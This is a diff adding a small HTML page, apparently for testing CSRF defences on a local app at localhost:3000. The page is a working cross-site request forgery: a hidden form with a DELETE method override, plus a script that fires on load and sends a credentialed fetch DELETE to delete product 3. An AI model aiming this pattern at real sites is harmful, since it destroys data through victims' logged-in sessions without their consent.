@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Malicious CSRF Attack Page 2</h1>
+    <p>Clicking the button below will delete a product without the user's consent!</p>
+
+    <!-- Tester si le HTML PEUT utilsier la methode DELETE  -->
+    <form action="http://localhost:3000/products/3" method="POST">
+        <input type="hidden" name="_method" value="DELETE">
+        <button type="submit">Delete Product</button>
+    </form>
+
+    <!-- Si le HTML n'arrive pas, JS le fera (on peut directement lancer le JS)-->
+    <script>
+        fetch('http://localhost:3000/products/3', {
+            method: 'DELETE',
+            credentials: 'include',
+        });
+    </script>
+</body>
+</html>
